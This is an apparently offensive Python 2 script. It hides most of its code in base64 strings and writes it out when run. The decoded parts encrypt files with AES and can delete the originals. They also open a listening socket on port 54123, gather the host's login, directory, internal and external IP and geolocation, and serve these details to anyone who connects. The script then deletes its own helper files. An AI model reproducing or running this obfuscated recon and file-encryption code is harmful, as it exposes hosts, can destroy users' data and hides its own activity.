import base64
import sys
import os 


def create_utils():
	needed_imports = {'Crypto.Random': 'get_random_bytes',
					  'Crypto.Cipher': 'AES'}
	header = 'import base64\nimport socket\nimport os\n'
	for lib in needed_imports.keys():
		header += 'from %s import %s\n' % (lib, needed_imports[lib])
	body = base64.b64decode('CkJTWj0xNjtQQUQ9J3snCnBhZD1sYW1iZGEgczogcyArIChCU1ogLSBsZW4ocykgJSBCU1opKlBBRAo=')
	enc = base64.b64decode('RW5jb2RlQUVTID0gbGFtYmRhIGMsIHM6IGJhc2U2NC5iNjRlbmNvZGUoYy5lbmNyeXB0KHBhZChzKSkpCg==')
	dec = base64.b64decode('RGVjb2RlQUVTID0gbGFtYmRhIGMsIGU6IGMuZGVjcnlwdChiYXNlNjQuYjY0ZGVjb2RlKGUpKS5yc3RyaXAoUEFEKQo=')
	rcv = base64.b64decode('ZGVmIHN0YXJ0X2xpc3RlbmVyKHBvcnQpOgoJdHJ5OgoJCXM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2Nr'\
			'ZXQuU09DS19TVFJFQU0pCgkJcy5iaW5kKCgnMC4wLjAuMCcsNTQxMjMpKQoJCXMubGlzdGVuKDUpCglleGNlcHQgc29ja2V0LmVycm9yOgo'
			'JCXJldHVybiBbXQoJcmV0dXJuIHMK')
	hide = base64.b64decode('CmRlZiBmZW5jcnlwdChmbmFtZSxkZXN0cm95KToKCWlmIG5vdCBvcy5wYXRoLmlzZmlsZS'\
		   'hmbmFtZSk6CgkJZXhpdCgpCgllZmlsZT1mbmFtZS5zcGxpdCgiLyIpWy0xXS5zcGxpdCgi'\
		   'LiIpWzBdKyIubG9sIgoJY29udGVudD1vcGVuKGZuYW1lLCJyYiIpLnJlYWQoKQoJaz1nZX'\
		   'RfcmFuZG9tX2J5dGVzKDE2KTtvcGVuKGVmaWxlLCJ3YiIpLndyaXRlKEVuY29kZUFFUyhB'\
		   'RVMubmV3KGspLGNvbnRlbnQpKQoJb3BlbihmbmFtZS5zcGxpdCgiLyIpWy0xXS5zcGxpdC'\
		   'giLiIpWzBdKyIua2V5Iiwid2IiKS53cml0ZShiYXNlNjQuYjY0ZW5jb2RlKGspKQoJaWYg'\
		   'ZGVzdHJveToKCQlvcy5yZW1vdmUoZm5hbWUpCgo=')
	see = base64.b64decode('ZGVmIGZkZWNyeXB0KGZuYW1lKToKCWVuY2Q9b3BlbihmbmFtZSwicmIiKS5yZWFkKCkKCWtm'\
		  'PWZuYW1lLnNwbGl0KCIuIilbMF0rIi5rZXkiCglrPWJhc2U2NC5iNjRkZWNvZGUob3Blbihr'\
		  'ZiwicmIiKS5yZWFkKCkpCglyZXR1cm4gRGVjb2RlQUVTKEFFUy5uZXcoayksZW5jZCkKCg==')
	content = header+body+enc+dec+'\n'+rcv+hide+see
	open(os.getcwd()+'/utils.py', 'wb').write(content)


def decode_module(modfile):
	os.system('gunzip %s.b64.gz' % modfile)
	content = ''
	for chunk in open(modfile+'.b64','rb').readlines():
		content += base64.b64decode(chunk)+'\n\n'
	open('%s.py'%modfile,'wb').write(content)

def serve():
	# Start a Simple Listening Webserver?
	bcmd = 'aW1wb3J0IG9zLHNvY2tldCx1dGlscyxtb2R1bGU7IHNlcnZpbmcgPSBUcnVlCnMgPSB1dGlscy5zdGFydF9sa'\
	'XN0ZW5lcig1NDEyMykKaCA9ICI8aHRtbD5cbjx0aXRsZT4lczwvdGl0bGU+XG48Ym9keT48aDE+JXM8L2gxPiIgJSAob'\
	'3MuZ2V0bG9naW4oKSxvcy5nZXRjd2QoKSkKaDIgPSAiXG48aDE+JXM8L2gxPlxuPGgxPiVzPC9oMT5cbiIgJSAobW9kd'\
	'WxlLmdldF9pbnRlcm5hbF9hZGRyKCksIG1vZHVsZS5nZXRfZXh0X2lwKCkpCmVuZCA9ICJcbjwvYm9keT5cbjwvaHRtb'\
	'D4iCnBhZ2U9aCtoMitlbmQKdHJ5OgoJd2hpbGUgc2VydmluZzoKCQljbGllbnQsIGNhZGRyID0gcy5hY2NlcHQoKQoJC'\
	'WNsaWVuZC5zZW5kKHBhZ2UpCgkJY2xpZW50LmNsb3NlKCkKZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgoJc2VydmluZ'\
	'z1GYWxzZQpzLmNsb3NlKCkK'
	open('tmp.py','wb').write(base64.b64decode(bcmd))
	os.system('python tmp.py')
	os.remove('tmp.py')


def main():
	create_utils()
	import utils 
	decode_module('module')
	import module

	if module.nix:
		print 'UNIX system'
		curdir = module.pwd
		ext_ip = module.get_ext_ip()
		int_ip = module.get_internal_addr()
		ip_info = module.get_ip_info(ext_ip)
		ip_data = module.parse_info(ip_info)

		print 'Current Dir:\t%s' % curdir
		print 'Internal IP:\t%s' % int_ip
		print 'External IP:\t%s' % ext_ip
		print 'Location:\t%s, %s' % (ip_data['city'], ip_data['country'])
		print 'Timezone:\t%s' % (ip_data['timezone'])
		print 'Organization:\t%s' % (ip_data['org'])

		if '-s' in sys.argv:
			serve()
		
	if module.dos:
		print 'Windows System'
	
	# cleanup 
	cleanup = ['module.py', 'utils.py', 'utils.pyc', 'module.pyc']
	for fobj in cleanup:
		os.remove(fobj)

if __name__ == '__main__':
	main()

